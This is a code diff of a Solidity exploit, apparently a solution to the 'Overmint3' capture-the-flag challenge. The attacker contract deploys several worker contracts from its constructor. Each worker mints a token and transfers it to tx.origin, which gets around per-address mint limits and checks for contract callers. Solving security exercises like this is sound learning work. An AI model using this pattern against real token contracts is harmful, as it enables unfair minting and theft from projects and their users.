@@ -5,28 +5,17 @@ import "@openzeppelin/contracts/utils/Address.sol";
 import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
 import "./Overmint3.sol";
 
-contract Overmint3Attacker is IERC721Receiver {
-    Overmint3 private targetContract;
-    address private receiver;
-
-    constructor(Overmint3 _targetContract) {
-        targetContract = _targetContract;
-        receiver = msg.sender;
-    }
-
-    function onERC721Received(address, address, uint256, bytes memory) public override returns (bytes4) {
-        return IERC721Receiver.onERC721Received.selector;
-    }
-
-    function attack() public {
+contract Overmint3AttackerWorker {
+    constructor(Overmint3 targetContract, uint256 tokenId) {
         targetContract.mint();
+        targetContract.transferFrom(address(this), tx.origin, tokenId);
     }
 }
 
-contract Overmint3AttackerProxy {
+contract Overmint3Attacker {
     constructor(Overmint3 targetContract) {
-        Overmint3Attacker attacker = new Overmint3Attacker(targetContract);
-        (bool ok,) = address(attacker).call(abi.encodeWithSignature("attack()"));
-        require(ok, "attack failed");
+        for (uint256 tokenId = 1; tokenId < 6; tokenId++) {
+            new Overmint3AttackerWorker(targetContract, tokenId);
+        }
     }
 }
